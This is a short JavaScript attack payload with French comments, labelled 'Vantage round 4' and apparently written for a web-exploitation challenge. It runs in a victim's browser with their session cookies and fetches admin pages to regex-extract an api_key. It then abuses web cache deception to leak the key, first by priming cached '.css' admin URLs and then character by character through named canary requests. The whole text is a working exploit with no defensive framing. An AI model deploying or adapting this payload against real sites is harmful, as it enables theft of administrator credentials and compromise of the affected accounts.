/* Vantage round 4 : extraire l'api_key et amorcer le cache de la console admin. */
(async () => {
  const cred = { credentials: 'include' };
  const g    = (u) => fetch(u, cred).then(r => r.text()).catch(() => '');
  const mark = (n) => fetch('/account.php/' + n + '.css', cred).catch(() => 0);
  await mark('p4ran');
  const idx = await g('/admin/index.php');
  const rev = await g('/admin/review.php');
  const m = (idx + rev).match(/api[_\-]?key["'=:\s]*([A-Za-z0-9_\-]{12,})/i);
  const k = m ? m[1] : '';
  if (!k) { await mark('p4nokey'); return; }
  await mark('p4key');
  await mark('p4len_' + k.length);
  // Méthode A : amorcer le cache des pages admin en fournissant l'api_key en query
  try { const r1 = await fetch('/admin/index.php/ov.css?api_key=' + k, cred); if (r1.ok) await mark('p4A_ov_ok'); } catch (e) {}
  try { const r2 = await fetch('/admin/review.php/rv.css?api_key=' + k, cred); if (r2.ok) await mark('p4A_rv_ok'); } catch (e) {}
  // variantes de routage au cas où le PATH_INFO gêne
  try { const r3 = await fetch('/admin/index.php?api_key=' + k + '&x=ov2.css', cred); } catch (e) {}
  // Méthode B (repli) : exfiltrer l'api_key caractère par caractère dans des canaris nommés
  for (let i = 0; i < k.length && i < 80; i++) { await mark('p4c_' + i + '_' + k[i]); }
})();
